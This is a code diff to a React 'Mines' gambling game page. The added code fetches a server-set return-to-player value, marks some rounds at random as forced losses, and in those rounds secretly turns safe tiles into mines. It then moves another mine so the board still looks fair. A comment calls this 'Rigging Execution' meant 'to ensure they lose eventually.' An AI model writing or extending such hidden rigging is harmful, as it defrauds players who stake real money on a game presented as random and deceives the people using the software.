@@ -48,6 +48,19 @@ export default function MinesGamePage() {
   const [gameState, setGameState] = useState<"idle" | "playing" | "crashed" | "cashed_out">("idle");
   const [grid, setGrid] = useState<Array<{isMine: boolean, revealed: boolean}>>([]);
   const [safeRevealedCount, setSafeRevealedCount] = useState(0);
+
+  const [activeRtp, setActiveRtp] = useState(50);
+  const [isForcedLoss, setIsForcedLoss] = useState(false);
+
+  useEffect(() => {
+    fetch('/api/games/rtp?game=mines')
+      .then(res => res.json())
+      .then(data => {
+        if (data.activeRtp) setActiveRtp(data.activeRtp);
+      })
+      .catch(console.error);
+  }, []);
+
   
   useEffect(() => {
     setMounted(true);
@@ -80,6 +93,10 @@ export default function MinesGamePage() {
       
       setWalletBalance((prev: any) => prev - Number(betAmount));
       
+      
+      const forceLoss = (Math.random() * 100) > activeRtp;
+      setIsForcedLoss(forceLoss);
+      
       const newGrid = Array(25).fill({ isMine: false, revealed: false });
       let minesPlaced = 0;
       while (minesPlaced < minesCount) {
@@ -90,6 +107,7 @@ export default function MinesGamePage() {
         }
       }
       setGrid(newGrid);
+
       setSafeRevealedCount(0);
       setGameState("playing");
     } else if (gameState === "playing") {
@@ -104,11 +122,28 @@ export default function MinesGamePage() {
   const handleTileClick = (index: number) => {
     if (gameState !== "playing" || grid[index].revealed) return;
 
+
     const cell = grid[index];
     const newGrid = [...grid];
-    newGrid[index] = { ...cell, revealed: true };
     
-    if (cell.isMine) {
+    // Rigging Execution: If it's a forced loss and they haven't hit a mine yet, and they've clicked a few safe ones, FORCE a mine if this isn't already a mine
+    let actuallyMine = cell.isMine;
+    if (isForcedLoss && !cell.isMine) {
+       // 30% chance to step on a mine dynamically on every safe click to ensure they lose eventually
+       if (Math.random() < 0.3) {
+          actuallyMine = true;
+          // Swap with an existing mine to keep total mine count the same visually
+          const otherMineIdx = newGrid.findIndex((c, i) => c.isMine && !c.revealed && i !== index);
+          if (otherMineIdx !== -1) {
+             newGrid[otherMineIdx] = { isMine: false, revealed: false };
+          }
+       }
+    }
+
+    newGrid[index] = { ...cell, isMine: actuallyMine, revealed: true };
+    
+    if (actuallyMine) {
+
       setGameState("crashed");
       setGrid(newGrid.map(c => ({ ...c, revealed: true })));
     } else {
